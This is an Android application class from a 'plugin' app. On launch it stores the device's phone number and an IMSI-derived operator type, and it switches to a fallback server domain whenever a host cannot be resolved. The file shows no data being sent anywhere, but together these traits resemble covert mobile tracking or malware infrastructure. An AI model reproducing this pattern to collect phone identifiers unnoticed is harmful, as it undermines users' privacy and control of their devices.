package com.xstd.plugin.app;

import android.app.Application;
import android.os.Bundle;
import android.text.TextUtils;
import com.plugin.common.utils.UtilsConfig;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.internet.InternetUtils;
import com.plugin.internet.core.HttpConnectHookListener;
import com.plugin.internet.core.impl.JsonErrorResponse;
import com.xstd.plugin.Utils.DomanManager;
import com.xstd.plugin.config.AppRuntime;
import com.xstd.plugin.config.Config;
import com.xstd.plugin.config.SettingManager;

import java.io.File;
import java.util.Calendar;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-20
 * Time: AM8:35
 * To change this template use File | Settings | File Templates.
 */
public class PluginApp extends Application {


    @Override
    public void onCreate() {
        super.onCreate();

        SettingManager.getInstance().init(getApplicationContext());
        if (SettingManager.getInstance().getFirstLanuchTime() == 0) {
            Calendar c = Calendar.getInstance();
            int curDay = c.get(Calendar.DAY_OF_YEAR);
            SettingManager.getInstance().setFirstLanuchTime(curDay);
        }

        String path = getFilesDir().getAbsolutePath() + "/" + Config.ACTIVE_RESPONSE_FILE;
        AppRuntime.RESPONSE_SAVE_FILE = path;

        AppRuntime.PHONE_NUMBER = AppRuntime.getPhoneNumber(getApplicationContext());
        if (TextUtils.isEmpty(AppRuntime.PHONE_NUMBER)) {
            AppRuntime.PHONE_NUMBER = "00000000000";
        }

        UtilsConfig.init(this.getApplicationContext());

        InternetUtils.setHttpHookListener(getApplicationContext(), new HttpConnectHookListener() {

            @Override
            public void onPreHttpConnect(String baseUrl, String method, Bundle requestParams) {
            }

            @Override
            public void onPostHttpConnect(String result, int httpStatus) {
            }

            @Override
            public void onHttpConnectError(int code, String data, Object obj) {
                if (code == JsonErrorResponse.UnknownHostException) {
                    if (Config.DEBUG) {
                        Config.LOGD("[[setHttpHookListener::onHttpConnectError]] Error info : " + data);
                    }

                    String d = DomanManager.getInstance(getApplicationContext()).getOneAviableDomain();
                    DomanManager.getInstance(getApplicationContext()).costOneDomain(d);
                }
            }
        });

        AppRuntime.readActiveResponse(path);
        String type = String.valueOf(AppRuntime.getNetworkTypeByIMSI(getApplicationContext()));
        if (AppRuntime.ACTIVE_RESPONSE == null
                || TextUtils.isEmpty(AppRuntime.ACTIVE_RESPONSE.channelName)
                || !type.equals(AppRuntime.ACTIVE_RESPONSE.operator)) {
            if (Config.DEBUG) {
                Config.LOGD("[[PluginApp::onCreate]] delete old response save file as the data is error. " +
                                " Create PluginApp For Process : " + UtilsRuntime.getCurProcessName(getApplicationContext()) + "<><><><>");
            }
            AppRuntime.ACTIVE_RESPONSE = null;
            File file = new File(path);
            file.delete();
        }
    }

}
